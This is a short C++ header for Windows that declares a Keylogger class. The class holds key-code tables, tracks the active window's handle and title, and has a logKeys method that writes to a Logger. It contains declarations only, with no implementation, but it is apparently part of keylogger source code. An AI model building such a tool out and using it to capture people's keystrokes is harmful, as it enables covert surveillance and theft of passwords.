#pragma once
#include <windows.h>
#include "../Logger/Logger.h"
#include <string>
#include <vector>


class Keylogger {
private:
	static const std::vector<int> valueKeys;
	static const std::vector<int> specialKeys;
	static const std::vector<int> numpadKeys;
	static const std::vector<int> funcKeys;
	static const std::vector<std::vector<int>> trackedKeys;

	static const std::vector<std::wstring> specialKeysNames;

	Logger* logger;
	HWND hLastTrackedWindow = NULL;
	bool titleUpdateRequest = false;
	std::wstring windowTitle;

public:
	Keylogger(Logger* logger);
	~Keylogger();

	void logKeys();

};